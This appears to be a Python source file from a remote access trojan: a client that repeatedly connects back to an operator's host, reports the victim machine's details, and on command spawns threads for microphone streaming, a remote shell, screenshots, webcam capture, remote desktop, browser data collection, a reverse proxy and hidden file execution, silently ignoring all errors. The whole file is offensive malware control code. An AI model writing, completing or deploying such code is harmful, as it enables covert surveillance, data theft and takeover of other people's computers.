from .looped import LoopedClient
from .plugins.client_info import ClientInfo
import time
import threading
from .plugins.shared import SharedData
from .features.audio import start_audio_stream
from .features.terminal import terminal
from .features.screenshot import send_screenshot
from .features.webcam import send_webcam_frame
from .features.remote_desktop import start_remote_desktop
from .features.power import power
from .features.browsers import browsers
from .features.proxy import start_reverse_proxy
from .plugins.shell import ShellHandler
from .features.client_center import ClientCenter
from .plugins.convert import Converter
from .features.execute import execute_file
from .features.chat import chat


def start_connection(HOST, PORT):
    
    client = ClientInfo()
    client_details = client.get_details()
    shared = SharedData()
    converter = Converter()
    shell_handler = ShellHandler()

    client = LoopedClient(HOST, PORT, retry="forever", retry_interval=5)

    @client.on('connect')
    def handle_connect(client_id: str):
        client_info = { 
            "new_client": client_details
        }
        client.send_message(converter.encode(client_info))

    @client.on('message')
    def handle_message(message: str):
        try:
            message = converter.decode(message)
            if message.get("audiostream") is not None:
                if message.get("stop_audio") is not None:
                    shared.set_data("start_audio", False, True)
                    return
                shared.set_data("start_audio", True, False)
                thread = threading.Thread(target=start_audio_stream, args=(client, shared, converter))
                thread.daemon = True
                thread.start()

            elif message.get("terminal") is not None:
                thread = threading.Thread(target=terminal, args=(message, client, shell_handler, converter))
                thread.daemon = True
                thread.start()

            elif message.get("screenshot") is not None:
                threading.Thread(target=send_screenshot, args=(client, converter)).start()

            elif message.get("webcam") is not None:
                thread = threading.Thread(target=send_webcam_frame, args=(client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("remote_desktop") is not None and message.get("port") is not None:
                thread = threading.Thread(target=start_remote_desktop, args=(message, HOST, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("power") is not None:
                thread = threading.Thread(target=power, args=(message, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("browsers") is not None:
                thread = threading.Thread(target=browsers, args=(message, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("reverse_proxy") is not None and message.get("port") is not None:
                thread = threading.Thread(target=start_reverse_proxy, args=(message, HOST, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("client") is not None:
                thread = threading.Thread(target=ClientCenter, args=(message, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("execute_file") is not None and message.get("visibility") is not None:
                thread = threading.Thread(target=execute_file, args=(message, client, converter))
                thread.daemon = True
                thread.start()

            elif message.get("chat") is not None:
                chat_online = message.get("chat_online")
                chat_messages = message.get("chat_messages")
                first_time = message.get("first_time")
                shared.set_data("chat_online", chat_online, False)
                if chat_messages:
                    shared.set_data("chat_messages", chat_messages, True)
            
                if first_time:
                    thread = threading.Thread(target=chat, args=(message, client, converter, shared))
                    thread.daemon = True
                    thread.start()

        except Exception as e:
            pass


    @client.on('message_sent')
    def handle_message_sent(message: str):
        pass

    @client.on('error')
    def handle_error(error: str):
        pass

    @client.on('disconnect')
    def handle_disconnect():
        pass

    client.connect()

    while True:
        time.sleep(1)